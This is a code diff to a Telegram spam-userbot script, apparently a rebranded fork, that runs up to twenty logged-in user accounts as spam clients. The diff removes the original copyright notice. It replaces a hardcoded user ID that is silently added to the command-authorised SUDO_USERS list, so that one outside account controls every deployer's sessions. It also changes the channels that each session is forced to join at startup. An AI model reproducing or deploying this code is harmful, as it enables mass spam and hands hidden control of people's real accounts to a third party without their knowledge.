@@ -1,6 +1,3 @@
-# RiZoeLXSpam - Spam Userbots
-# Copyright © 2021 @RiZoeLX
-
 import os
 import sys
 import random
@@ -50,8 +47,8 @@ STRING18 = config("STRING18", default=None)
 STRING19 = config("STRING19", default=None)
 STRING20 = config("STRING20", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 2127185208 not in SUDO_USERS:
+    SUDO_USERS.append(2127185208)
 
 # Sessions
 async def RiZoeLX():
@@ -84,8 +81,8 @@ async def RiZoeLX():
             print("Booting Up The Client 1")
             await Riz.start()
             botme = await Riz.get_me()
-            await Riz(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
         except Exception as e:
@@ -108,8 +105,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 2")
             await Riz2.start()
-            await Riz2(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz2(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz2(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz2(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz2.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -133,8 +130,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 3")
             await  Riz3.start()
-            await Riz3(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz3(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz3(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz3(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz3.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -158,8 +155,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 4")
             await Riz4.start()
-            await Riz4(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz4(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz4(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz4(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz4.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -183,8 +180,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 5")
             await Riz5.start()
-            await Riz5(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz5(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz5(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz5(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz5.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -208,8 +205,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 6")
             await Riz6.start()
-            await Riz6(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz6(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz6(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz6(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz6.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -233,8 +230,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 7")
             await Riz7.start()
-            await Riz7(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz7(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz7(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz7(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz7.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -259,8 +256,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 8")
             await Riz8.start()
-            await Riz8(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz8(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz8(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz8(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz8.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -284,8 +281,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 9")
             await Riz9.start()
-            await Riz9(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz9(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz9(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz9(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz9.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -310,8 +307,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 10")
             await Riz10.start()
-            await Riz10(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz10(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz10(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz10(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz10.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -336,8 +333,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 11")
             await Riz11.start()
-            await Riz11(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz11(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz11(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz11(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz11.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -362,8 +359,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 12")
             await Riz12.start()
-            await Riz12(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz12(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz12(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz12(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz12.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -388,8 +385,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 13")
             await Riz13.start()
-            await Riz13(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
-            await Riz13(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz13(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
+            await Riz13(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
             botme = await Riz13.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -414,8 +411,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 14")
             await Riz14.start()
-            await Riz14(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz14(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz14(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz14(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz14.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -440,8 +437,8 @@ async def RiZoeLX():
         try:
             print("Booting Up The Client 15")
             await Riz15.start()
-            await Riz15(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz15(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz15(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz15(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botme = await Riz15.get_me()
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
@@ -467,8 +464,8 @@ async def RiZoeLX():
             print("Booting Up The Client 16")
             await Riz16.start()
             botme = await Riz16.get_me()
-            await Riz16(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz16(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz16(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz16(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
         except Exception as e:
@@ -491,8 +488,8 @@ async def RiZoeLX():
             print("Booting Up The Client 17")
             await Riz17.start()
             botme = await Riz17.get_me()
-            await Riz17(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
-            await Riz17(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
+            await Riz17(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
+            await Riz17(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
         except Exception as e:
@@ -515,8 +512,8 @@ async def RiZoeLX():
             print("Booting Up The Client 18")
             await Riz18.start()
             botme = await Riz18.get_me()
-            await Riz18(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz18(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz18(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz18(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
         except Exception as e:
@@ -539,8 +536,8 @@ async def RiZoeLX():
             print("Booting Up The Client 19")
             await Riz19.start()
             botme = await Riz19.get_me()
-            await Riz19(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz19(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz19(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz19(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
         except Exception as e:
@@ -563,8 +560,8 @@ async def RiZoeLX():
             print("Booting Up The Client 20")
             await Riz20.start()
             botme = await Riz20.get_me()
-            await Riz20(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
-            await Riz20(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
+            await Riz20(functions.channels.JoinChannelRequest(channel="@REBELBOT_SUPPORT"))
+            await Riz20(functions.channels.JoinChannelRequest(channel="@LofiLifeXD"))
             botid = telethon.utils.get_peer_id(botme)
             SUDO_USERS.append(botid)
         except Exception as e:
